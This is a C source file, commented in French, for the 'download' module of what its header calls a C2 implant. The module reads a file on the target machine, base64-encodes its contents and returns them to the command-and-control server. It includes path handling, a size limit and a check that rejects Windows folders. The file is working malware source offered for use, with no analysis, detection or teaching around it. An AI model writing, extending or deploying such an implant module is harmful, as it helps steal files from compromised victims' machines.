/*
 * ============================================================
 *  modules/mod_download.c — Module download
 *
 *  Rôle : Lire un fichier sur la cible et retourner son
 *         contenu encodé en base64 vers le serveur C2.
 *
 *  Limites :
 *    - Fichiers > 10 MB refusés (débordement buffer base64)
 *    - Les dossiers sont explicitement rejetés (Windows)
 * ============================================================
 */
#include "../platform.h"
#include "../config.h"
#include "../utils.h"
#include "module.h"

/**
 * Lit le fichier spécifié dans ctx->command ("download <path>"),
 * l'encode en base64 et l'écrit dans ctx->output.
 * Retourne 1 si succès, 0 si erreur.
 */
int mod_download_exec(ModuleContext *ctx) {
    char path[1024] = {0};
    extract_path(ctx->command, "download ", path, sizeof(path));
    if (!path[0]) {
        strncpy(ctx->output, "[ERREUR] Usage: download <chemin_fichier>",
                ctx->output_size - 1);
        return 0;
    }

#ifdef PLATFORM_WINDOWS
    /* Rejette explicitement les dossiers — donne un message clair */
    DWORD attrs = GetFileAttributesA(path);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] '%s' est un dossier — specifiez le chemin complet du fichier",
                 path);
        return 0;
    }
#endif

    FILE *f = fopen(path, "rb");
    if (!f) {
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] Fichier introuvable: %s", path);
        return 0;
    }

    fseek(f, 0, SEEK_END);
    long fsz = ftell(f); fseek(f, 0, SEEK_SET);

    if (fsz <= 0 || fsz > 10 * 1024 * 1024) {
        fclose(f);
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] Taille invalide: %ld bytes", fsz);
        return 0;
    }

    unsigned char *raw = malloc(fsz);
    if (!raw) { fclose(f); return 0; }
    fread(raw, 1, fsz, f); fclose(f);

    size_t b64_len = ((fsz + 2) / 3) * 4 + 1;
    if (b64_len >= ctx->output_size) {
        free(raw);
        strncpy(ctx->output, "[ERREUR] Fichier trop grand pour le buffer",
                ctx->output_size - 1);
        return 0;
    }

    b64_encode(raw, (size_t)fsz, ctx->output);
    free(raw);
    return 1;
}
